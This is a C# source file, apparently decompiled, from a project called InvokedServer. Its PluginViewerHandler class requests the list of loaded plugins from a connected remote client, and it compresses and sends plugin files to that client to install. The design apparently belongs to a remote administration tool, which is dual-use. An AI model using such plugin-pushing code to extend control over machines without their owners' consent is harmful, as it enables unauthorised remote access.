

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedServer.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;


namespace InvokedServer.Messages
{
	public class PluginViewerHandler : MessageProcessorBase<object>, IDisposable
	{
		private readonly InvokedServer.Networking.Client _client;

		public event PluginViewerHandler.LoadedPluginsHandler NewPlugins;

		private void OnNewLoadedPlugins(List<string> text)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				PluginViewerHandler.LoadedPluginsHandler newPlugins = this.NewPlugins;
				if (newPlugins == null)
					return;
				newPlugins((object)this, (List<string>)val);
			}), (object)text);
		}

		public PluginViewerHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message) => message is GetLoadedPluginsResponse;

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetLoadedPluginsResponse message1))
				return;
			this.Execute(sender, message1);
		}

		public void GetLoadedPlugins() => this._client.Send<InvokedCommon.Messages.GetLoadedPlugins>(new InvokedCommon.Messages.GetLoadedPlugins());

		public void InstallPlugin(string pluginFullPath, string pluginName)
		{
			if (!File.Exists(pluginFullPath))
				return;
			this._client.Send<DoPlugin>(new DoPlugin()
			{
				PluginName = pluginName,
				Data = Zip.Compress(File.ReadAllBytes(pluginFullPath))
			});
		}

		private void Execute(ISender client, GetLoadedPluginsResponse message)
		{
			if (message.PluginNames != null)
				this.OnNewLoadedPlugins(message.PluginNames);
			else
				this.OnNewLoadedPlugins(new List<string>());
		}

		public void Dispose() => GC.SuppressFinalize((object)this);

		public delegate void LoadedPluginsHandler(object sender, List<string> plugins);
	}
}